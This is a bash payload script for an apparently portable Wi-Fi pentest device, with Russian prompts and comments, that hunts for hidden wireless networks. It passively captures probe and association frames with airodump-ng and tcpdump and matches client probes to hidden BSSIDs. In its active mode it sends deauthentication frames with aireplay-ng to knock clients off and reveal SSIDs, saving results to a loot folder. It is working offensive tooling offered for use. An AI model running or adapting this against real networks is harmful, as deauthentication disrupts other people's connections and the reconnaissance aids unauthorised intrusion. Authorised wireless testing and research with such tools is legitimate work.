#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: Обнаружение скрытых сетей
# Author: NullSec
# Description: Обнаружение скрытых SSID через пассивный и активный анализ
# Category: nullsec/recon

# === FIX: правильный PATH и fallback-функции для работы через UI ===
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH

# Определяем коды подтверждения duckyscript (если не заданы)
DUCKYSCRIPT_USER_CONFIRMED=0
DUCKYSCRIPT_CANCELLED=1
DUCKYSCRIPT_REJECTED=1

command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Нажмите Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ОШИБКА: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[ЛОГ] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Готово"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Выбор (по умолчанию $2): " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Подтвердить? (y/n): " confirm; [ "$confirm" = "y" ] && echo "$DUCKYSCRIPT_USER_CONFIRMED" || echo "$DUCKYSCRIPT_CANCELLED"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Введите значение: " val; echo "$val"; }
# ================================================

LOOT_DIR="/mmc/nullsec/hiddennets"
mkdir -p "$LOOT_DIR"

PROMPT "ОБНАРУЖЕНИЕ СКРЫТЫХ СЕТЕЙ

Обнаружение скрытых и
маскирующихся Wi-Fi сетей.

Методы:
- Пассивный захват проб
- Перехват ассоциаций клиентов
- Активное раскрытие через деаут
- Сопоставление проб со
  скрытыми BSSID

Нажмите ОК для настройки."

# Поиск интерфейса монитора
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "Нет интерфейса монитора!

Включите режим монитора:
airmon-ng start wlan1"; exit 1; }

PROMPT "РЕЖИМ ОБНАРУЖЕНИЯ:

1. Только пассивный (скрыто)
2. Пассивный + перекрёстный анализ проб
3. Активное раскрытие через деаут
4. Полный (все режимы)

Интерфейс: $MONITOR_IF

Выберите режим далее."

DISC_MODE=$(NUMBER_PICKER "Режим (1-4):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DISC_MODE=2 ;; esac

DURATION=$(NUMBER_PICKER "Длительность сканирования (секунд):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac
[ $DURATION -lt 30 ] && DURATION=30
[ $DURATION -gt 600 ] && DURATION=600

CHANNEL_RANGE=$(CONFIRMATION_DIALOG "Сканировать все каналы?

ДА = Каналы 1-14
НЕТ = Только популярные 2.4 ГГц
     (1, 6, 11)")
if [ "$CHANNEL_RANGE" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    CHANNELS="1-14"
else
    CHANNELS="1,6,11"
fi

resp=$(CONFIRMATION_DIALOG "НАЧАТЬ ПОИСК СКРЫТЫХ СЕТЕЙ?

Режим: $DISC_MODE
Длительность: ${DURATION}с
Каналы: $CHANNELS
Интерфейс: $MONITOR_IF

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/hidden_$TIMESTAMP.txt"
CAP_PREFIX="/tmp/hidden_cap_$$"

LOG "Сканирование скрытых сетей..."
SPINNER_START "Поиск скрытых SSID..."

echo "=======================================" > "$REPORT"
echo "    ОТЧЁТ О СКРЫТЫХ СЕТЯХ NULLSEC     " >> "$REPORT"
echo "=======================================" >> "$REPORT"
echo "" >> "$REPORT"
echo "Время сканирования: $(date)" >> "$REPORT"
echo "Длительность: ${DURATION}с" >> "$REPORT"
echo "Режим: $DISC_MODE" >> "$REPORT"
echo "" >> "$REPORT"

# Фаза 1: Пассивное сканирование скрытых AP
echo "--- ФАЗА 1: ПАССИВНОЕ СКАНИРОВАНИЕ ---" >> "$REPORT"
echo "" >> "$REPORT"

timeout "$DURATION" airodump-ng "$MONITOR_IF" -c "$CHANNELS" \
    --write-interval 5 -w "$CAP_PREFIX" --output-format csv 2>/dev/null &
SCAN_PID=$!

# Параллельный захват probe-запросов и ответов
PROBE_LOG="/tmp/hidden_probes_$$.txt"
timeout "$DURATION" tcpdump -i "$MONITOR_IF" -e -l \
    'type mgt and (subtype probe-req or subtype probe-resp or subtype assoc-req)' 2>/dev/null > "$PROBE_LOG" &
PROBE_PID=$!

sleep "$DURATION"
kill $SCAN_PID $PROBE_PID 2>/dev/null
wait $SCAN_PID $PROBE_PID 2>/dev/null

# Парсим скрытые AP (пустой ESSID в CSV airodump)
HIDDEN_FILE="/tmp/hidden_aps_$$.txt"
grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${CAP_PREFIX}"*.csv 2>/dev/null | \
    awk -F',' '{gsub(/ /,"",$14); if($14=="" || length($14)==0) print $1","$4","$6","$9","$14}' > "$HIDDEN_FILE"

HIDDEN_COUNT=$(wc -l < "$HIDDEN_FILE" 2>/dev/null | tr -d ' ')
echo "Обнаружено скрытых AP: $HIDDEN_COUNT" >> "$REPORT"
echo "" >> "$REPORT"

while IFS=',' read -r bssid channel enc power essid; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [ -z "$bssid" ] && continue
    echo "СКРЫТАЯ AP: $bssid | Канал:$channel | Шифрование:$enc | Уровень:$power дБм" >> "$REPORT"
done < "$HIDDEN_FILE"

# Фаза 2: Перекрёстный анализ probe-запросов
if [ "$DISC_MODE" -ge 2 ]; then
    echo "" >> "$REPORT"
    echo "--- ФАЗА 2: ПЕРЕКРЁСТНЫЙ АНАЛИЗ PROBE-ЗАПРОСОВ ---" >> "$REPORT"
    echo "" >> "$REPORT"

    for BSSID in $(awk -F',' '{print $1}' "$HIDDEN_FILE" 2>/dev/null | tr -d ' '); do
        [ -z "$BSSID" ] && continue
        # Находим клиентов, ассоциированных с этим BSSID
        CLIENTS=$(grep "$BSSID" "${CAP_PREFIX}"*.csv 2>/dev/null | grep -v "^$BSSID" | awk -F',' '{print $1}' | tr -d ' ')
        for CLIENT in $CLIENTS; do
            # Ищем probe-запросы от этих клиентов
            PROBED=$(grep "$CLIENT" "$PROBE_LOG" 2>/dev/null | grep -oE "Probe Request \([^)]+\)" | head -5)
            if [ -n "$PROBED" ]; then
                echo "AP $BSSID <- Клиент $CLIENT просил:" >> "$REPORT"
                echo "  $PROBED" >> "$REPORT"
            fi
        done
    done
fi

# Фаза 3: Активное раскрытие через деаутентификацию
if [ "$DISC_MODE" -ge 3 ]; then
    echo "" >> "$REPORT"
    echo "--- ФАЗА 3: АКТИВНОЕ РАСКРЫТИЕ ---" >> "$REPORT"
    echo "" >> "$REPORT"

    for BSSID in $(awk -F',' '{print $1}' "$HIDDEN_FILE" 2>/dev/null | tr -d ' ' | head -5); do
        [ -z "$BSSID" ] && continue
        CH=$(grep "$BSSID" "$HIDDEN_FILE" | head -1 | awk -F',' '{print $2}' | tr -d ' ')
        iwconfig "$MONITOR_IF" channel "$CH" 2>/dev/null

        # Краткая деаутентификация для принудительной переассоциации
        timeout 5 aireplay-ng -0 2 -a "$BSSID" "$MONITOR_IF" 2>/dev/null &

        # Захват ответа переассоциации
        REVEALED=$(timeout 10 tcpdump -i "$MONITOR_IF" -e -c 5 \
            "ether host $BSSID and type mgt and (subtype assoc-resp or subtype probe-resp)" 2>/dev/null | \
            grep -oE "SSID=\S+" | head -1)

        if [ -n "$REVEALED" ]; then
            echo "РАСКРЫТА: $BSSID -> $REVEALED" >> "$REPORT"
        else
            echo "НЕ РАСКРЫТА: $BSSID (нет ответа)" >> "$REPORT"
        fi
    done
fi

echo "" >> "$REPORT"
echo "=======================================" >> "$REPORT"

# Очистка
rm -f "${CAP_PREFIX}"* "$PROBE_LOG" "$HIDDEN_FILE" 2>/dev/null

SPINNER_STOP

TOTAL_APS=$(grep -c "^BSSID\|Station" "${CAP_PREFIX}"*.csv 2>/dev/null || echo "?")
REVEALED_COUNT=$(grep -c "РАСКРЫТА:" "$REPORT" 2>/dev/null || echo 0)

PROMPT "ПОИСК СКРЫТЫХ СЕТЕЙ ЗАВЕРШЁН

Скрытых AP: $HIDDEN_COUNT
Раскрыто SSID: $REVEALED_COUNT
Длительность: ${DURATION}с

Отчёт сохранён:
$REPORT

Нажмите OK для выхода."

exit 0
